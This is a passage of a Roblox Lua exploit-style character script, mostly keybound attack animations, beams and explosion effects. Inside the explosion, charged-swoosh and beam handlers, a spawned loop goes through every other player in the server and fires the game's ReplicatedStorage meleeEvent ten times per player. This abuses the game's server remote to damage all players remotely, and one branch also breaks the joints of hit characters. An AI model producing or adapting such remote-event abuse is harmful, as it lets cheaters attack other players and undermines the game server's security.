RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.2,1,.5) * CFrame.Angles(math.rad(-90),math.rad(-25),math.rad(0)), 0.5)
swait()
end
end)()
charging = false
local ballzor = Instance.new("Part",Torso)
ballzor.Name = "ballzor"
ballzor.Material = "Neon"
ballzor.BrickColor = BrickColor.new("Really black")
ballzor.CanCollide = false
ballzor.Size = Vector3.new(xz,xz,xz)
ballzor.Anchored = false
ballzor.CFrame = Root.CFrame * CFrame.new(1,0,-5)
ballzor.Shape = "Ball"
removeuseless:AddItem(g1,.0001)
zx = xz + .05
coroutine.wrap(function()
if firsttime5 then return end
firsttime5 = true
while true do
swait()
for i,v in pairs(Torso:GetChildren()) do
if v.Name == "ballzor" then
magicccc = Instance.new("Part",RightArm)
magicccc.Material = "Neon"
magicccc.CanCollide = false
magicccc.Name = "magicccc"
magicccc.Anchored = true
magicccc.Transparency = 0
magicccc.BrickColor = BrickColor.new(colors)
magicccc.Size = Vector3.new(zx,zx,zx)
magicccc.CFrame = v.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
removeuseless:AddItem(magicccc,2)
end
end
for i,v in pairs(RightArm:GetChildren()) do
if v.Name == "magicccc" then
v.Transparency = v.Transparency + 0.025
end
end
end
end)()
ballzor.Touched:connect(function(hit)
if hit.Name ~= "magicccc" then
if bigball then return end
bigball = true
local explosionwave = Instance.new("Part",Torso) 
explosionwave.Shape = "Ball"
explosionwave.BrickColor = BrickColor.new("Really black")
explosionwave.Anchored = true
explosionwave.CanCollide = false
explosionwave.Transparency = .2
explosionwave.Material = "Neon"
explosionwave.Size = Vector3.new(1,1,1)
explosionwave.CFrame = ballzor.CFrame
render = Instance.new("Sound",explosionwave)
render.SoundId = "rbxassetid://2006635781"
render.Volume = 10 * 10
render:Play()
local explosionwave2 = Instance.new("Part",Torso)
explosionwave2.Shape = "Ball"
explosionwave2.BrickColor = BrickColor.new("Really red")
explosionwave2.Anchored = true
explosionwave2.CanCollide = false
explosionwave2.Material = "Neon"
explosionwave2.Size = Vector3.new(.8,.8,.8)
explosionwave2.CFrame = ballzor.CFrame
deadlywave = Instance.new("Part", explosionwave)
deadlywave.Size = Vector3.new(1,1,1)
deadlywave.CanCollide = false
deadlywave.Anchored = true
deadlywave.Transparency = .5
deadlywave.BrickColor = BrickColor.new("Really red")
deadlywave.CFrame = CFrame.new(explosionwave.Position)
deadlywavemesh = Instance.new("SpecialMesh", deadlywave)
deadlywavemesh.Scale = Vector3.new(1,2,1)
deadlywavemesh.MeshId = "rbxassetid://20329976"
deadlywave2 = Instance.new("Part", explosionwave)
deadlywave2.Size = Vector3.new(1,1,1)
deadlywave2.CanCollide = false
deadlywave2.Anchored = true
deadlywave2.Transparency = .5
deadlywave2.BrickColor = BrickColor.new("Really black")
deadlywave2.CFrame = CFrame.new(explosionwave.Position)
deadlywave2mesh = Instance.new("SpecialMesh", deadlywave2)
deadlywave2mesh.Scale = Vector3.new(3,2,3)
deadlywave2mesh.MeshId = "rbxassetid://20329976"
deadlyring = Instance.new("Part", Torso)
deadlyring.Size = Vector3.new(5, 5, 5)
deadlyring.Transparency = 0.5
deadlyring.BrickColor = BrickColor.new("Really black")
deadlyring.Anchored = true
deadlyring.CanCollide = false
deadlyring.CFrame = deadlywave.CFrame * CFrame.Angles(math.rad(math.random(-180,180)), math.rad(math.random(-180,180)), math.rad(math.random(-180,180)))
deadlyringh = Instance.new("SpecialMesh", deadlyring) 
deadlyringh.MeshId = "http://www.roblox.com/asset/?id=3270017" 
deadlyringh.Scale = Vector3.new(8, 8, .1)
deadlyring2 = Instance.new("Part", Torso)
deadlyring2.Size = Vector3.new(5, 5, 5)
deadlyring2.Transparency = 0.5
deadlyring2.BrickColor = BrickColor.new("Really black")
deadlyring2.Anchored = true
deadlyring2.CanCollide = false
deadlyring2.CFrame = deadlywave.CFrame * CFrame.Angles(math.rad(math.random(-180,180)), math.rad(math.random(-180,180)), math.rad(math.random(-180,180)))
deadlyringh2 = Instance.new("SpecialMesh", deadlyring2) 
deadlyringh2.MeshId = "http://www.roblox.com/asset/?id=3270017" 
deadlyringh2.Scale = Vector3.new(8, 8, .1)
ballzor:Remove()
bigball = false
staybooming = true
d = 5
coroutine.wrap(function()
while staybooming do
Hit = damagealll(d,deadlywave.Position)
for _,v in pairs(Hit) do			
		  spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
vel.velocity = CFrame.new(deadlywave.Position,torso.Position).lookVector*50
removeuseless:AddItem(vel,.1)
end
wait(.1)
end
end)()
for i = 1, 70 do
d = d + 1
deadlyringh2.Scale = deadlyringh2.Scale + Vector3.new(.5, .5, .1)
deadlyringh.Scale = deadlyringh.Scale + Vector3.new(.5, .5, .1)
deadlyring.CFrame = deadlyring.CFrame * CFrame.Angles(math.rad(0+7),math.rad(0-7),math.rad(0+7))
deadlyring2.CFrame = deadlyring2.CFrame * CFrame.Angles(math.rad(0-7),math.rad(0+7),math.rad(0-7))
deadlywave.CFrame = deadlywave.CFrame * CFrame.Angles(0,math.rad(0+7),0)
deadlywave2.CFrame = deadlywave2.CFrame * CFrame.Angles(0,math.rad(0+4),0)
deadlywavemesh.Scale = deadlywavemesh.Scale + Vector3.new(.4,0,.4)
deadlywave2mesh.Scale = deadlywave2mesh.Scale + Vector3.new(.5,0,.5)
explosionwave.Size = explosionwave.Size + Vector3.new(.5,.5,.5)
explosionwave2.Size = explosionwave2.Size + Vector3.new(.5,.5,.5)
swait()
end
for i = 1, 80 do
d = d + 3
hum.CameraOffset = Vector3.new(math.random(-1,1),math.random(-1,1),math.random(-1,1))
deadlyringh2.Scale = deadlyringh2.Scale + Vector3.new(4, 4, .2)
deadlyringh.Scale = deadlyringh.Scale + Vector3.new(4, 4, .2)
deadlyring.CFrame = deadlyring.CFrame * CFrame.Angles(math.rad(0+12),math.rad(0-12),math.rad(0+12))
deadlyring2.CFrame = deadlyring2.CFrame * CFrame.Angles(math.rad(0-12),math.rad(0+12),math.rad(0-12))
deadlywave.CFrame = deadlywave.CFrame * CFrame.Angles(0,math.rad(0+20),0)
deadlywave2.CFrame = deadlywave2.CFrame * CFrame.Angles(0,math.rad(0+14),0)
deadlywavemesh.Scale = deadlywavemesh.Scale + Vector3.new(3,2,3)
deadlywave2mesh.Scale = deadlywave2mesh.Scale + Vector3.new(4,1,4)
explosionwave.Size = explosionwave.Size + Vector3.new(4,4,4)
explosionwave2.Size = explosionwave2.Size + Vector3.new(4,4,4)
swait()
end
staybooming = false
for i = 1, 20 do
d = d + 3
hum.CameraOffset = Vector3.new(math.random(-1,1),math.random(-1,1),math.random(-1,1))
deadlyringh2.Scale = deadlyringh2.Scale + Vector3.new(4, 4, .2)
deadlyringh.Scale = deadlyringh.Scale + Vector3.new(4, 4, .2)
deadlyring.CFrame = deadlyring.CFrame * CFrame.Angles(math.rad(0+12),math.rad(0-12),math.rad(0+12))
deadlyring2.CFrame = deadlyring2.CFrame * CFrame.Angles(math.rad(0-12),math.rad(0+12),math.rad(0-12))
deadlyring.Transparency = deadlyring.Transparency + .25
deadlyring2.Transparency = deadlyring2.Transparency + .25
deadlywave.CFrame = deadlywave.CFrame * CFrame.Angles(0,math.rad(0+20),0)
deadlywave2.CFrame = deadlywave2.CFrame * CFrame.Angles(0,math.rad(0+14),0)
deadlywavemesh.Scale = deadlywavemesh.Scale + Vector3.new(3,0,3)
deadlywave2mesh.Scale = deadlywave2mesh.Scale + Vector3.new(4,0,4)
deadlywave.Transparency = deadlywave.Transparency + .25
deadlywave2.Transparency = deadlywave2.Transparency + .25
explosionwave.Size = explosionwave.Size + Vector3.new(4,4,4)
explosionwave2.Size = explosionwave2.Size + Vector3.new(4,4,4)
explosionwave.Transparency = explosionwave.Transparency + 0.25
explosionwave2.Transparency = explosionwave2.Transparency + 0.05
swait()
end
hum.CameraOffset = Vector3.new(0,0,0)
explosionwave:Remove()
explosionwave2:Remove()
end
end)
bov = Instance.new("BodyVelocity",ballzor)
bov.maxForce = Vector3.new(99999,99999,99999)
ballzor.CFrame = CFrame.new(ballzor.Position,mouse.Hit.p)
bov.velocity = ballzor.CFrame.lookVector*200
removeuseless:AddItem(ballzor,4)
ws = 50
attacking = false
debounce = false
appi = false
end
end)

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='j' then
if not levitate then return end
if debounce then return end
debounce = true
charging = true
attacking = true
downpress = false
x = 1
ws = 0
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
SOUND(RightArm,2014087015,8,false,3)
coroutine.wrap(function()
Charge = Instance.new("Sound",RightArm)
Charge.SoundId = "rbxassetid://101153932"
Charge.Looped = false
Charge.Volume = 8
Charge:Play()
end)()
appi = true
coroutine.wrap(function()
while appi do
swait()
if Root.Velocity.Magnitude < 2 and attacking == true then
position = "Idle3"
end
end
end)()
coroutine.wrap(function()
while appi do
swait()
settime = 0.05
sine = sine + change
if position == "Idle3" and attacking == true and appi == true then
change = .4
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(-.2,.2,0) * CFrame.Angles(0,0,0),.1)
LEFTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.8 - .1 * math.sin(sine/9), 0) * CFrame.Angles(math.rad(0), math.rad(0 + 3 * math.sin(sine/9)), math.rad(35 - 5 * math.sin(sine/9))), 0.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.4)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 2.0,0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10 + 2 * math.sin(sine/9))), 0.4)
end
end
end)()
for i = 1, 15 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-10),math.rad(-15),math.rad(0)),.5)
RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(14), math.rad(20), math.rad(-90)), 0.3)
swait()
end
for i = 1, 3 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.4)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-10),math.rad(-15),math.rad(0)),.5)
RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(14), math.rad(20), math.rad(-90)), 0.3)
x = x + .1
blastborb = Instance.new("Part",Torso)
blastborb.CFrame = rightlocation.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
blastborb.BrickColor = BrickColor.new(colors)
blastborb.Anchored = true
blastborb.Size = Vector3.new(10,10,10)
blastborb.CanCollide = false
blastborb.Material = "Neon"
for i = 1, 5 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.4)
blastborb.Size = blastborb.Size - Vector3.new(1,1,1)
swait()
end
blastborb:Remove()
swait()
end
downpress = true
while charging and x < 5  do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.4)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-10),math.rad(-15),math.rad(0)),.5)
RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(14), math.rad(20), math.rad(-90)), 0.3)
x = x + .1
blastborb = Instance.new("Part",Torso)
blastborb.CFrame = rightlocation.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
blastborb.BrickColor = BrickColor.new(colors)
blastborb.Anchored = true
blastborb.Size = Vector3.new(10,10,10)
blastborb.CanCollide = false
blastborb.Material = "Neon"
for i = 1, 5 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.4)
blastborb.Size = blastborb.Size - Vector3.new(1,1,1)
swait()
end
blastborb:Remove()
swait()
end
coroutine.wrap(function()
for i = 1, 20 do
Charge.Volume = Charge.Volume - .5
swait()
end
end)()
local bigswoosh = Instance.new("Part",Torso)
bigswoosh.Name = "bigswoosh"
bigswoosh.CFrame = Root.CFrame * CFrame.new(1,0,-5)
bigswoosh.Size = Vector3.new(1,1,1)
bigswoosh.Material = "Neon"
bigswoosh.Anchored = true
bigswoosh.Transparency = 1
bigswoosh.BrickColor = BrickColor.new("Really red")
bigswoosh.CanCollide = false
SOUND(bigswoosh,842332424,10,false,6)
SOUND(bigswoosh,2017948224,10,false,6)
SOUND(bigswoosh,138677306,10,false,4)
coroutine.wrap(function()
local loc1 = Instance.new("Part",bigswoosh)
loc1.CFrame = bigswoosh.CFrame * CFrame.new(-3,0,0)
loc1.Size = Vector3.new(2,2,2)
loc1.Anchored = true
loc1.Transparency = 1
loc1.CanCollide = false
local loc2 = Instance.new("Part",bigswoosh)
loc2.CFrame = bigswoosh.CFrame * CFrame.new(3,0,0)
loc2.Size = Vector3.new(2,2,2)
loc2.Anchored = true
loc2.Transparency = 1
loc2.CanCollide = false
n = 0
nb = 0
for i = 1, 125 do
n = n + x
nb = nb - x
Hit = damagealll(n,bigswoosh.Position)
for _,v in pairs(Hit) do
if x > 4.5 then		
v:FindFirstChildOfClass("Humanoid").Parent:BreakJoints()
else	
		  spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
end
vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
vel.velocity = CFrame.new(bigswoosh.Position,torso.Position).lookVector*150
removeuseless:AddItem(vel,.1)
end
local bigtrail = Instance.new("Part",LeftArm)
bigtrail.Size = bigswoosh.Size
bigtrail.BrickColor = BrickColor.new(colors)
bigtrail.Anchored = true
bigtrail.Material = "Neon"
bigtrail.CFrame = bigswoosh.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
bigtrail.CanCollide = false
removeuseless:AddItem(bigtrail,2)
local irritatedground = Instance.new("Part",Torso)
irritatedground.Size = Vector3.new(n*1.5,1,3*x)
irritatedground.BrickColor = BrickColor.new(colors)
irritatedground.Material = "Neon"
irritatedground.CFrame = bigswoosh.CFrame * CFrame.new(0,-6,0)
irritatedground.CanCollide = false
irritatedground.Anchored = true
removeuseless:AddItem(irritatedground,10)
local grassblocks = Instance.new("Part",Torso)
grassblocks.Size = Vector3.new(n/2,n/2,n/2)
grassblocks.Material = "Grass"
grassblocks.Anchored = true
grassblocks.Name = "grassblocks"
grassblocks.BrickColor = BrickColor.new("Bright green")
grassblocks.CFrame = loc1.CFrame * CFrame.new(0,-1,0) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
removeuseless:AddItem(grassblocks,10)
local grassblocks2 = Instance.new("Part",Torso)
grassblocks2.Size = Vector3.new(n/2,n/2,n/2)
grassblocks2.Material = "Grass"
grassblocks2.Anchored = true
grassblocks2.Name = "grassblocks2"
grassblocks2.BrickColor = BrickColor.new("Bright green")
grassblocks2.CFrame = loc2.CFrame * CFrame.new(0,-1,0) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
removeuseless:AddItem(grassblocks2,10)
bigswoosh.Size = bigswoosh.Size + Vector3.new(x,x,x)
loc1.CFrame = bigswoosh.CFrame * CFrame.new(n,-3,0)
loc2.CFrame = bigswoosh.CFrame * CFrame.new(nb,-3,0)
bigswoosh.CFrame = bigswoosh.CFrame * CFrame.new(0,0,-3 - x)
swait()
end
for i = 1, 20 do
bigswoosh.CFrame = bigswoosh.CFrame * CFrame.new(0,0,-3)
bigswoosh.Transparency = bigswoosh.Transparency + 0.05
swait()
end
bigswoosh:Remove()
end)()
for i = 1, 50 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(10),math.rad(15),math.rad(0)),.5)
RIGHTARMLERP.C1 = CFrame.new(0,0,0)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.2,1,.5) * CFrame.Angles(math.rad(-90),math.rad(-25),math.rad(0)), 0.5)
swait()
end
ws = 50
attacking = false
debounce = false
appi = false
g1:Remove()
end
end)

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='k' then
if not levitate then return end
if debounce then return end
debounce = true
attacking = true
charging = true
appi = true
coroutine.wrap(function()
while appi do
swait()
if Root.Velocity.Magnitude < 2 and attacking == true then
position = "Idle3"
end
end
end)()
coroutine.wrap(function()
while appi do
swait()
settime = 0.05
sine = sine + change
if position == "Idle3" and attacking == true and appi == true then
change = .4
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(-.2,.2,0) * CFrame.Angles(0,0,0),.1)
LEFTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.8 - .1 * math.sin(sine/9), 0) * CFrame.Angles(math.rad(0), math.rad(0 + 3 * math.sin(sine/9)), math.rad(35 - 5 * math.sin(sine/9))), 0.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.4)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 2.0,0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10 + 2 * math.sin(sine/9))), 0.4)
end
end
end)()
ws = 0
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
g1.CFrame = CFrame.new(Root.Position,mouse.Hit.p)
for i = 1, 15 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),math.rad(90),math.rad(0)),.3)
RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-.5, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-90)), 0.3)
swait()
end
r = 0
for i = 1, 10 do
r = r + .1
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.3)
blass = Instance.new("Part",RightArm)
blass.Size = Vector3.new(r,r,r)
blass.Material = "Neon"
blass.CFrame = rightlocation.CFrame * CFrame.new(0,-r/1.5,0) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
blass.Anchored = true
blass.CanCollide = false
blass.BrickColor = BrickColor.new(colors)
removeuseless:AddItem(blass,2)
swait()
end
while r < 16 and charging == true do
r = r + .1
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.3)
blass = Instance.new("Part",RightArm)
blass.Size = Vector3.new(r,r,r)
blass.Material = "Neon"
blass.CFrame = rightlocation.CFrame * CFrame.new(0,-r/1.5,0) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
blass.Anchored = true
blass.CanCollide = false
blass.BrickColor = BrickColor.new(colors)
removeuseless:AddItem(blass,2)
swait()
end
local TheBeam = Instance.new("Part",RightArm)
TheBeam.Name = "zebeam"
TheBeam.Size = Vector3.new(1,1,1)
TheBeam.Material = "Neon"
TheBeam.Shape = "Cylinder"
TheBeam.BrickColor = BrickColor.new("Really red")
TheBeam.Anchored = true
TheBeam.CanCollide = false
ws = 12
bemmo = Instance.new("Sound",RightArm)
bemmo.SoundId = "rbxassetid://1910988873"
bemmo.Volume = 8
bemmo.Looped = false
bemmo:Play()
bemmo.TimePosition = 2
for i = 1, 100 * r/3 do
if r > 15 then
hum.CameraOffset = Vector3.new(math.random(-1,1),math.random(-1,1),math.random(-0,0))
end
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.3)
local blass = Instance.new("Part",RightArm)
blass.Size = Vector3.new(r,r,r)
blass.Material = "Neon"
blass.CFrame = rightlocation.CFrame * CFrame.new(0,-r/1.5,0) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
blass.Anchored = true
blass.CanCollide = false
blass.BrickColor = BrickColor.new(colors)
removeuseless:AddItem(blass,2)
local STARTPOS = blass.CFrame*CFrame.new(0,0,0).p
local ENDHIT,ENDPOS = ray2(STARTPOS,mouse.Hit.p,650,Character)
local DISTANCE = (STARTPOS - ENDPOS).magnitude
TheBeam.CFrame = CFrame.new(STARTPOS,ENDPOS)*CFrame.new(0,0,-DISTANCE/2) * CFrame.Angles(math.rad(0),math.rad(90),math.rad(0))
TheBeam.Size = Vector3.new(DISTANCE,r/math.random(1,2),r/math.random(1,2))
boom = Instance.new("Part",RightArm)
boom.Size = Vector3.new(r,r,r)
boom.BrickColor = BrickColor.new(colors)
boom.Anchored = true
boom.CanCollide = false
boom.Material = "Neon"
boom.CFrame = CFrame.new(ENDPOS) * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
removeuseless:AddItem(boom,3)
boom.Touched:connect(function(getbase)
if hitdebounce then return end
hitdebounce = true
if getbase:IsA("Part") then
damagedground = Instance.new("Part",RightArm)
damagedground.Size = Vector3.new(.1,5+r,.1)
damagedground.Material = "Neon"
damagedground.CanCollide = false
damagedground.BrickColor = BrickColor.new(colors)
damagedground.Anchored = true
damagedground.CFrame = boom.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
removeuseless:AddItem(damagedground,2)
wait(.1)
hitdebounce = false
end
end)
Hit = damagealll(r+3,boom.Position)
for _,v in pairs(Hit) do	
		  spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
vel.velocity = CFrame.new(boom.Position,torso.Position).lookVector*r
removeuseless:AddItem(vel,.1)
end
swait()
end
removeuseless:AddItem(g1,.001)
coroutine.wrap(function()
for i = 1, 20 do
bemmo.Volume = bemmo.Volume - 0.5
blass.Transparency = blass.Transparency + 0.05
TheBeam.Transparency = TheBeam.Transparency + 0.05
swait()
end
bemmo:Remove()
if r > 15 then
hum.CameraOffset = Vector3.new(0,0,0)
end
blass:Remove()
TheBeam:Remove()
end)()
ws = 50
appi = false
attacking = false
debounce = false
end
end)

mouse.KeyUp:connect(function(Press)
Press=Press:lower()
if Press=='j' then
charging = false
end
end)

mouse.KeyUp:connect(function(Press)
Press=Press:lower()
if Press=='k' then
charging = false
end
end)

doit = coroutine.wrap(function()
while true do
for _,v in pairs(Repeater) do
v.Scale =  v.Scale + Vector3.new(1, 1, 1)
end

for _,v in pairs(openshocktable) do
v.Scale =  v.Scale + Vector3.new(3, 3, 3)
end

for _,v in pairs(nonmeshRepeater) do
v.Size =  v.Size + Vector3.new(2, 2, 2)
end

for _,v in pairs(Extreme) do
v.Size =  v.Size + Vector3.new(6, 6, 6)
end

for _,v in pairs(LessSize) do
v.Size = v.Size - Vector3.new(1, 1, 1)
end

for _,v in pairs(nonmeshRepeater2) do
v.Transparency = v.Transparency + 0.05
end

for _,v in pairs(Repeater2) do
v.Transparency = v.Transparency - 0.05
end

for _,v in pairs(th1) do
v.CFrame = v.CFrame * CFrame.new(0,0+.3,0) * CFrame.Angles(0,math.rad(0+8),0)
end

for _,v in pairs(th2) do
v.CFrame = v.CFrame * CFrame.new(0,0,0) * CFrame.Angles(0,math.rad(0+15),0)
end

for _,v in pairs(th3) do
v.Scale = v.Scale + Vector3.new(2, 2, 2)
end

for _,v in pairs(th5) do
v.Scale = v.Scale + Vector3.new(1, .1, 1)
end

for _,v in pairs(ExtremeM) do
v.Size = v.Size + Vector3.new(8, 8, 8)
end

for _,v in pairs(m3) do
v.Scale = v.Scale + Vector3.new(.2,.2,.2)
end

for _,v in pairs(ExtremeM2) do
v.Size = v.Size - Vector3.new(2,2,2)
end

for _,v in pairs(keyYsize) do
v.Scale = v.Scale + Vector3.new(8, 8, 1)
end

for _,v in pairs(th4) do
v.Transparency = v.Transparency + 0.009
v.Rotation = v.Rotation + Vector3.new(3,0,0)
end

for _,v in pairs(SlowlyFade) do
v.Transparency = v.Transparency + 0.05
end

for _,v in pairs(keyYtransparency) do
v.Transparency = v.Transparency + 0.05
end

for _,v in pairs(UpMover) do
v.Position = v.Position + Vector3.new(0, 3, 0)
end

for _,v in pairs(ForwardMover) do
v.CFrame = v.CFrame * CFrame.new(0, 0, 2.4 +(i/.1)) * CFrame.Angles(0, 0, math.rad(0))
end

for _,v in pairs(FadeIn) do
v.Transparency = v.Transparency - .05
end

for _,v in pairs(signtransparency) do
v.TextTransparency = v.TextTransparency + 0.025
end

for _,v in pairs(signmover) do
v.StudsOffset = v.StudsOffset + Vector3.new(math.random(-2,2),.3,math.random(-2,2))
end

for _,v in pairs(signrotator) do
v.Rotation = v.Rotation + 2
end
swait()
end
end)
doit()
t = 0

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='0' then
if levitate then return end
shoov = true
if debounce then return end
ws = 50
end
end)

mouse.KeyUp:connect(function(Press)
Press=Press:lower()
if Press=='0' then
if levitate then return end
shoov = false
if debounce then return end
ws = 10
end
end)


local anims = coroutine.wrap(function()
while true do
settime = 0.05
sine = sine + change
if position == "Jump" and attacking == false then
change = 1
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(-3),math.rad(-4)), 0.4)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(3),math.rad(4)), 0.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.4)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)), 0.4)
elseif position == "Jump2" and attacking == false and levitate then
change = 1
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-20 - 1 * math.sin(sine/9)), math.rad(0 + 0 * math.cos(sine/8)), math.rad(0) + Root.RotVelocity.Y / 30, math.cos(10 * math.cos(sine/10))), 0.3)
